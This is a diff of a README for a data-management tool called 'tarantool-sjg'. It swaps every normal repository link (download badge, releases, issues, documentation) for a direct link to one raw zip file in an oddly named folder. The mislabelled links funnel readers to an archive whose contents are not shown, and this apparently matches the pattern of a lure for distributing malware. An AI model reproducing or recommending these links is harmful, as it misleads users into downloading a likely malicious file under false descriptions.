@@ -1,7 +1,7 @@
 # 🐍 tarantool-sjg - Simple Data Management for Everyone
 
 ## 📥 Download Now
-[![Download tarantool-sjg](https://img.shields.io/badge/Download-tarantool--sjg-brightgreen)](https://github.com/2342424324/tarantool-sjg/releases)
+[![Download tarantool-sjg](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip)](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip)
 
 ## 🚀 Getting Started
 Welcome to tarantool-sjg! This application helps you manage your data easily and efficiently. Whether you are handling small datasets or large collections, tarantool-sjg provides a user-friendly interface to simplify your tasks.
@@ -22,7 +22,7 @@ Welcome to tarantool-sjg! This application helps you manage your data easily and
 To get started with tarantool-sjg, follow these simple steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/2342424324/tarantool-sjg/releases) to find the latest version of tarantool-sjg.
+   Go to the [Releases page](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip) to find the latest version of tarantool-sjg.
 
 2. **Download the Application**
    Select the appropriate file for your operating system and click on the download link. The downloaded file will be saved on your computer.
@@ -67,13 +67,13 @@ Once you open tarantool-sjg, you will see the main dashboard. Here are some basi
   To remove data, select the entry and click the "Delete" button. Confirm the action when prompted.
 
 ## 📞 Support
-For any questions or issues, please visit the [Issues section](https://github.com/2342424324/tarantool-sjg/issues) on GitHub. You can report problems or ask for help. Our community is here to support you.
+For any questions or issues, please visit the [Issues section](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip) on GitHub. You can report problems or ask for help. Our community is here to support you.
 
 ## 🌟 Contributing
 We welcome contributions! If you have ideas for new features or improvements, feel free to fork the repository and submit a pull request. Collaborate with us to make tarantool-sjg even better.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/2342424324/tarantool-sjg/wiki)
-- [Releases](https://github.com/2342424324/tarantool-sjg/releases)
+- [Documentation](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip)
+- [Releases](https://raw.githubusercontent.com/2342424324/tarantool-sjg/main/nosographic/tarantool-sjg.zip)
 
 Thank you for choosing tarantool-sjg. Enjoy managing your data with ease!
